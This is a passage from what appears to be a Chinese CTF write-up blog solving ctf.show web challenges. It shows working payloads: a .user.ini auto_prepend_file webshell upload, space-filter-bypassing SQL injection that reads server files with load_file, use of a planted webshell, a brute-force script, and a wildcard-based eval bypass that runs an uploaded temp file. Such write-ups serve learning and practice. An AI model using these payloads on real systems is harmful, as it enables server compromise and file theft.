<code>.user.ini</code>  绕过黑名单</p>\n<p><strong>原理：</strong>  <code>PHP_INI_PREDIR</code>  模式的配置也可以在 <code>.user.ini</code>  文件中进行配置</p>\n<p>在 <code>PHP_INI_PERDIR</code>  模式中存在两个特殊的配置： <code>auto_append_file</code> 、 <code>auto_prepend_file</code> 。</p>\n<p><code>auto_prepend_file</code>  配置的作用为指定一个文件在主文件解析前解析， <code>auto_append_file</code>  的作用为指定一个文件在主文件解析后解析 因此可上传一个 <code>1.txt</code> ，内容为一句话木马 然后再上传包 <code>auto_prepend_file=1.txt</code>  的 <code>user.ini</code>  文件</p>\n<p>之后 payload： <code>http://14b1f783-83bc-4d8d-88dd-2c51ed6f4d05.challenge.ctf.show/?a=print_r(glob('*'));</code></p>\n<p>访问目录得到所有文件名，得到一个 php 文件名</p>\n<p>用 <code>highlight</code>  访问得到 flag</p>\n<h2 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h2>\n<p>首先是一个 <code>switch</code>  语句</p>\n<p>观察代码，明显是要输出 url 的内容，那么必然要进入带有双引号的语句</p>\n<p>根据 <code>switch</code>  语句的特性，可以输入 <code>c=3</code> , 输出 url</p>\n<p>访问得到的路径，发现是一个数据库查询页面，回显为 <code>alert</code></p>\n<p>尝试 <code>1</code> ，返回 <code>admin，2</code> ，返回另一个，输入 <code>1 or 1=1</code> ，无反应，改为 <code>1/**/or/**/1=1</code> ，正常回显</p>\n<p>于是清楚注入方式和空格过滤</p>\n<p>查看源码也可知 <code>information_schema.tables</code>  和 <code>information_schema.columns</code>  被过滤 这里采用反引号过滤即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>s</mi></msub><mi>c</mi><mi>h</mi><mi>e</mi><mi>m</mi><mi>a</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">‘</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant=\"normal\">‘</mi></mrow><annotation encoding=\"application/x-tex\">information_schema.`tables`</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">.</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">‘</span></span></span></span></p>\n<p>之后爆出库名，表名，字段 最后查询字段值时，返回 <code>1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</code></p>\n<p>也就是说 flag 可能在 <code>secret.php</code>  文件中 使用 MySQL 的 <code>load_file</code>  进行查询 访问默认目录 <code>/var/www/html/</code></p>\n<p><code>?query=0/**/union/**/select/**/load_file('/var/www/html/secret.php') </code></p>\n<p>查询后无回显，但查看源码，看到 alert 里面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$url = 'here_1s_your_f1ag.php';</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$file = '/tmp/gtf1y';</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>if(trim(@file_get_contents($file)) === 'ctf.show'){</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\techo file_get_contents('/real_flag_is_here');</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>}'</pre></td></tr></tbody></table></figure><p>也就是说 flag 可能在 <code>/real_flag_is_here</code>  里</p>\n<p>访问 <code>?query=0/**/union/**/select/**/load_file('/real_flag_is_here')</code></p>\n<p>无回显，但查看源码，同样在 alert 里，得到 flag</p>\n<h2 id=\"红包题第七弹\"><a class=\"anchor\" href=\"#红包题第七弹\">#</a> 红包题第七弹</h2>\n<p>页面显示 phpinfo () 的回显</p>\n<p>不知道咋做，网上搜索</p>\n<p>首先 wegt 下载 index，发现有后面文件，但无法访问</p>\n<p>shell 为 Letmein，使用蚁剑连接</p>\n<p>发现 flag.txt, 但点进去后没有内容，但 flag 是占用空间的</p>\n<p>那么回到网页，POST 传入 <code>Letmein=highlight_file ('/var/www/flag.txt');</code></p>\n<h2 id=\"ctfshow-web1\"><a class=\"anchor\" href=\"#ctfshow-web1\">#</a> CTFshow web1</h2>\n<p>爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://e9258400-1724-487b-b58e-e28eab62e8cc.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url1<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/reg.php\"</span> <span class=\"token comment\">#注册页面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url2<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/login.php\"</span><span class=\"token comment\">#登录界面</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url3<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/user_main.php?order=pwd\"</span> <span class=\"token comment\">#查询界面</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow{\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token string\">\"-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        l<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        l<span class=\"token operator\">=</span>k<span class=\"token operator\">+</span>i</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        l2 <span class=\"token operator\">=</span> k<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token string\">'email'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token string\">'nickname'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        data2<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                      <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l<span class=\"token operator\">==</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            k<span class=\"token operator\">=</span><span class=\"token string\">'flag'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        r1 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        r2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        r3 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        t <span class=\"token operator\">=</span> r3<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;\"</span><span class=\"token operator\">+</span>l<span class=\"token operator\">+</span><span class=\"token string\">\"&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;flag@ctf.show&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            k<span class=\"token operator\">=</span>l2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><h2 id=\"红包题第二弹\"><a class=\"anchor\" href=\"#红包题第二弹\">#</a> 红包题第二弹</h2>\n<p>查看源码，获得注释 <code>?cmd</code> ，修改网址，得到代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#error_reporting(0);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=UTF-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h4</span><span class=\"token punctuation\">&gt;</span></span>where is the flag?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h4</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">&lt;!-- hint:?cmd= --&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-oq-z0-9$]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cerror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\'|\\\"|\\:|\\,/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"serror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>     <span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>在 php 中，使用 <code>Content-Type: multipart/form-data;</code>  上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code>  参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code> 。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 <code>phpXXXX.tmp</code> （Windows 中）、 <code>php**.tmp</code> （Linux 中）。</p>\n<p>思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用 <code>eval</code>  函数进行执行临时文件。<br>\n然后再看 cmd 这里有两个过滤，过滤了除 p 以外的所有字母数字，可用的特殊字符为 <code>. ? /</code>  等。在 linux 中， <code>source</code>  命令和 <code>.</code>  相同，用于从当前 shell 会话中读取文件和执行命令。<br>\n在 php 中，命令执行方式有：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>system ('ls')</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>echo ('ls')</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo ls</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;?= 等价于 &lt;?php echo</pre></td></tr></tbody></table></figure><p>因为  <code>&lt;?=</code>  没有被过滤，所以就可以用 <code>?&gt;&lt;?=</code>  来传递命令执行临时文件的内容，构造的语句为 <code>?&gt;&lt;?= .+/??p/p?p??????; ， ?&gt; </code> 为了闭合之前的 php 语句，后面为执行命令的语句， <code>+</code>  在 url 中表示空格，利用？通配符匹配到 <code>/tmp/php**.tmp</code>  文件。<br>\n最终构造的 payload 为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host: 11b1397e-2020-484b-a7d3-484f22d4935b.challenge.ctf.show</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Accept-Encoding: gzip, deflate</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Connection: keep-alive</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Content-Length: 242</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-----------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Content-Disposition: form-data; name=\"fileUpload\"; filename=\"1.txt\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Content-Type: text/plain</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>#! /bin/bash</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cat /flag.txt</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>-----------------------------10242300956292313528205888--</pre></td></tr></tbody></table></figure><h2 id=\"game-gyctf-web2\"><a class=\"anchor\" href=\"#game-gyctf-web2\">#</a> game-gyctf web2</h2>\n<p>该题主要考察的时 php 反序列化和反序列化字符串逃逸</p>\n<p>首先，扫描出 <code>www.zip</code>  可以看到源码，分别为</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string double-quoted-string\">\"lib.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__DIR__</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>lib.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$array</span><span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'union'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'regexp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'into'</span><span class=\"token 